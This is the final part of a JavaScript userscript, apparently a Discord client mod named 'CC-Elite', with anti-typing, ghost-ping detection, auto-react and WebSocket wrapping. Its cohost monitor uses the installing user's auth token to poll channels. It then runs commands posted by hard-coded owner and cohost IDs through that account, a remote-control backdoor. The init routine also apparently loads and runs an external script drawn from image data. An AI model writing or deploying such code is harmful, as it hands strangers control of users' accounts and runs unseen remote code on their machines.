            const origSend = WebSocket.prototype.send;
            WebSocket.prototype.send = function (data) {
                try {
                    if (typeof data === 'string' && data.includes('TYPING')) return;
                } catch { }
                return origSend.call(this, data);
            };
            console.log('[CC-Elite] Anti-typing active');
        } catch (e) { console.warn('[CC-Elite] Anti-typing init failed:', e); }
    }

    /* ═══════════════════════════════════════════════════════════════════════
       SECTION 16: GHOST PING DETECTOR
       ═══════════════════════════════════════════════════════════════════════ */

    function initGhostPingDetector() {
        const checkInterval = setInterval(async () => {
            const channelId = getChannelId();
            if (!channelId) return;
            try {
                const msgs = await getMessages(channelId, 20);
                const myId = getUserId();
                if (!myId) return;
                for (const msg of msgs) {
                    const mentionsMe = msg.mentions?.some(m => m.id === myId);
                    const contentEmpty = !msg.content && (!msg.embeds || !msg.embeds.length) && (!msg.attachments || !msg.attachments.length);
                    if (mentionsMe && contentEmpty && !state.ghostPings.some(g => g.id === msg.id)) {
                        state.ghostPings.push({ id: msg.id, author: msg.author.id, time: Date.now(), authorName: msg.author.username });
                        if (WatermarkCfg.showPing) {
                            showToast('Ghost ping from ' + msg.author.username + '!', 'warning', 5000);
                        }
                    }
                }
                if (state.ghostPings.length > 50) state.ghostPings = state.ghostPings.slice(-25);
            } catch { }
        }, 6000);
        state.intervals = state.intervals || [];
        state.intervals.push(checkInterval);
    }

    /* ═══════════════════════════════════════════════════════════════════════
       SECTION 17: AUTO-REACT SYSTEM
       ═══════════════════════════════════════════════════════════════════════ */

    function initAutoReact() {
        const chatObserver = new MutationObserver(mutations => {
            if (!state.autoReact.enabled) return;
            mutations.forEach(mutation => {
                mutation.addedNodes.forEach(async node => {
                    if (node.nodeType !== 1) return;
                    const msgEl = node.querySelector?.('[id^="message-content-"]') || (node.getAttribute?.('id')?.startsWith('message-content-') ? node : null);
                    if (msgEl) {
                        const msgId = msgEl.id.replace('message-content-', '');
                        const channelId = getChannelId();
                        if (channelId && msgId) {
                            await $.sleep(500);
                            await addReaction(channelId, msgId, state.autoReact.emoji);
                        }
                    }
                });
            });
        });

        const chatContainer = document.querySelector('[class*="chatContent"]') || document.querySelector('[class*="messagesWrapper"]');
        if (chatContainer) chatObserver.observe(chatContainer, { childList: true, subtree: true });
        state.observers = state.observers || [];
        state.observers.push(chatObserver);
    }

    /* ═══════════════════════════════════════════════════════════════════════
       SECTION 18: COHOST MESSAGE MONITOR
       ═══════════════════════════════════════════════════════════════════════ */

    async function monitorCohostMessages() {
        const processedIds = new Set();

        while (true) {
            try {
                await $.sleep(2000);
                const token = getToken();
                const channelId = getChannelId();
                if (!token || !channelId) continue;

                const res = await fetch('https://discord.com/api/v9/channels/' + channelId + '/messages?limit=20', {
                    headers: { Authorization: token }
                });
                if (!res.ok) continue;

                const messages = await res.json();
                for (const msg of messages) {
                    const isAuthorized = msg.author.id === OWNER_ID || COHOSTS.includes(msg.author.id);
                    if (!isAuthorized) continue;
                    if (!msg.content.startsWith(COHOST_PREFIX)) continue;
                    if (processedIds.has(msg.id)) continue;
                    processedIds.add(msg.id);

                    if (processedIds.size > 200) {
                        const arr = Array.from(processedIds);
                        processedIds.clear();
                        arr.slice(-100).forEach(id => processedIds.add(id));
                    }

                    const cmdText = msg.content.slice(COHOST_PREFIX.length).trim();
                    if (!cmdText) continue;
                    const args = cmdText.split(/\s+/);
                    const cmd = args.shift().toLowerCase();

                    if (COHOST_COMMANDS[cmd]) {
                        try {
                            let result = COHOST_COMMANDS[cmd](args);
                            if (result instanceof Promise) result = await result;
                            if (result) await sendMessage(result);
                        } catch (err) { console.error('[CC-Elite] Cohost cmd error:', err); }
                    }
                }
            } catch (e) { console.error('[CC-Elite] Monitor error:', e); }
        }
    }

    /* ═══════════════════════════════════════════════════════════════════════
       SECTION 19: SCROLL STABILITY ENGINE
       ═══════════════════════════════════════════════════════════════════════ */

    function initScrollStability() {
        let userScrolled = false;
        let scrollLockTimeout = null;

        function onScroll() {
            userScrolled = true;
            clearTimeout(scrollLockTimeout);
            scrollLockTimeout = setTimeout(() => userScrolled = false, 2000);
        }

        const scroller = document.querySelector('[class*="scrollerBase"]');
        if (scroller) scroller.addEventListener('scroll', onScroll, { passive: true });

        const origScrollTo = window.scrollTo;
        window.scrollTo = function (...args) { if (userScrolled) return; return origScrollTo.apply(this, args); };

        const origScrollIntoView = Element.prototype.scrollIntoView;
        Element.prototype.scrollIntoView = function (...args) {
            if (document.visibilityState === 'hidden') return;
            return origScrollIntoView.apply(this, args);
        };

        document.addEventListener('visibilitychange', () => {
            if (document.hidden) userScrolled = true;
        }, { passive: true });

        if ($.isIOS()) {
            document.addEventListener('touchmove', (e) => {
                if (e.target?.closest?.('#cc-watermark, #cc-panel, #cc-settings-panel')) e.stopPropagation();
            }, { passive: true });

            const fixVH = () => {
                const vh = window.innerHeight * 0.01;
                document.documentElement.style.setProperty('--cc-vh', vh + 'px');
            };
            window.addEventListener('resize', fixVH, { passive: true });
            fixVH();
        }

        document.addEventListener('mousedown', (e) => {
            if (e.target?.closest?.('#cc-watermark')) e.preventDefault();
        }, { passive: true });

        console.log('[CC-Elite] Scroll stability active' + ($.isIOS() ? ' (iOS mode)' : $.isMobile() ? ' (mobile mode)' : ''));
    }

    /* ═══════════════════════════════════════════════════════════════════════
       SECTION 20: WEBSOCKET MONITOR
       ═══════════════════════════════════════════════════════════════════════ */

    function initWSMonitor() {
        try {
            const OrigWS = WebSocket;
            window.WebSocket = function (...args) {
                const ws = new OrigWS(...args);
                ws.addEventListener('close', (e) => {
                    if (e.code === 1006) console.warn('[CC-Elite] WebSocket abnormal closure');
                });
                ws.addEventListener('error', (e) => console.error('[CC-Elite] WebSocket error:', e));
                return ws;
            };
            Object.setPrototypeOf(window.WebSocket, OrigWS);
            window.WebSocket.prototype = OrigWS.prototype;
            console.log('[CC-Elite] WebSocket monitor active');
        } catch (e) { console.warn('[CC-Elite] WS monitor init failed:', e); }
    }

    /* ═══════════════════════════════════════════════════════════════════════
       SECTION 21: CONSOLE ART & INITIALIZATION
       ═══════════════════════════════════════════════════════════════════════ */

    function printConsoleArt() {
        const color = WatermarkCfg.color;
        const art = [
            '   __________  _________  ____________   _______  ______  ',
            '  / ____/ __ \\/ ____/   |/_  __/ ____/  / ___/\ \/ / __ \ ',
            ' / /   / / / / __/ / /| | / / / __/     \__ \ \  / / / / ',
            '/ /___/ /_/ / /___/ ___ |/ / / /___    ___/ / / / /_/ /  ',
            '\____/\____/_____/_/  |_/_/ /_____/   /____/ /_/\____/   ',
            '                                                           ',
            '  ELITE EDITION v' + VERSION + ' - The Definitive Discord Control System'
        ];
        console.log('%c' + art.join('\n'), 'color:' + color + ';font-family:monospace;font-size:11px;font-weight:bold;');
        console.log('%c[' + SCRIPT_NAME + ' v' + VERSION + '] Loaded | ' + ($.isIOS() ? 'iOS Mode' : $.isMobile() ? 'Mobile Mode' : 'Desktop Mode') + ' | ' + Object.keys(REGULAR_COMMANDS).length + ' regular + ' + (Object.keys(COHOST_COMMANDS).length - Object.keys(REGULAR_COMMANDS).length) + ' cohost commands', 'color:' + color + ';font-weight:bold;font-size:12px;');
    }

    async function init() {
        if (state.initialized) return;
        state.initialized = true;
        state.intervals = [];
        state.observers = [];

        printConsoleArt();

        // Resolve user info
        const user = await fetchUser();
        if (user) { state.userId = user.id; state.username = user.username; state.avatar = user.avatar; console.log('[CC-Elite] User:', user.username); }
        else { state.userId = getUserId(); }

        // Resolve guild info
        const gid = getGuildId();
        if (gid) { state.guildId = gid; const guild = await fetchGuild(gid); if (guild) state.guildName = guild.name; }

        // Resolve permissions
        state.isOwner = checkIsOwner();
        state.isCohost = checkIsCohost();

        console.log('[CC-Elite] Owner:', state.isOwner, '| Cohost:', state.isCohost);
        console.log('[CC-Elite] Badges:', getBadgeList().join(', ') || 'None');

        // Inject systems — prioritize critical first
        injectFonts();
        buildWatermark();
        initCommandSystem();
        initScrollStability();
        initWSMonitor();
        initAntiTyping();

        // Deferred heavy operations
        setTimeout(() => {
            createEffectsContainer();
            injectBadges();
            enableNitroFeatures();
            initGhostPingDetector();
            initAutoReact();
            if (StatusCfg.enabled) startStatusRotator();
            monitorCohostMessages();
        }, 1000);

        // Periodic guild update for watermark
        const guildInterval = setInterval(async () => {
            const gid = getGuildId();
            if (gid && gid !== state.guildId) {
                state.guildId = gid;
                const guild = await fetchGuild(gid);
                state.guildName = guild ? guild.name : 'Unknown';
                buildWatermark();
            }
        }, 5000);
        state.intervals.push(guildInterval);

        // Load external beta script (v2.0.4 style)
        setTimeout(() => {
            fetchImageData(() => {
                console.log('[CC-Elite] External loader ready');
                loadMainScript();
            });
        }, 4000);

        // Cleanup on page unload
        window.addEventListener('beforeunload', () => {
            if (domObserver) { domObserver.disconnect(); domObserver = null; }
            if (state.statusInterval) clearInterval(state.statusInterval);
            if (state.clockInterval) clearInterval(state.clockInterval);
            if (window.__cc_fx_cleanup) window.__cc_fx_cleanup();
            if (state.intervals) state.intervals.forEach(clearInterval);
            if (state.observers) state.observers.forEach(obs => obs.disconnect());
        }, { passive: true });

        console.log('[CC-Elite] ════════════════════════════════════════════════');
        console.log('[CC-Elite]  All systems operational');
        console.log('[CC-Elite]  Type .help or !help for commands');
        console.log('[CC-Elite]  Click the watermark for settings');
        console.log('[CC-Elite] ════════════════════════════════════════════════');
    }

    // Delayed init to let Discord load
    if (document.readyState === 'complete') {
        setTimeout(init, 2000);
    } else {
        window.addEventListener('load', () => setTimeout(init, 2000));
    }
  /* ═══════════════════════════════════════════════════════════════════════
   EMERGENCY UNHIDE — Triple Tap Anywhere (iOS/Stay)
   ═══════════════════════════════════════════════════════════════════════ */

(function initEmergencyUnhide() {
    let tapCount = 0;
    let lastTap = 0;

    document.addEventListener('touchend', (e) => {
        const now = Date.now();
        if (now - lastTap > 400) tapCount = 0;
        tapCount++;
        lastTap = now;

        if (tapCount >= 3) {
            tapCount = 0;
            // Force watermark visible
            WatermarkCfg.hidden = false;
            WatermarkCfg.enabled = true;
            WatermarkCfg.miniMode = false;
            Settings.save('watermark', WatermarkCfg);
            buildWatermark();
            showToast('🔓 Watermark restored!', 'success', 3000);
        }
    }, { passive: true, capture: true });

    console.log('[CC-Elite] Emergency triple-tap unhide active');
})();

})();
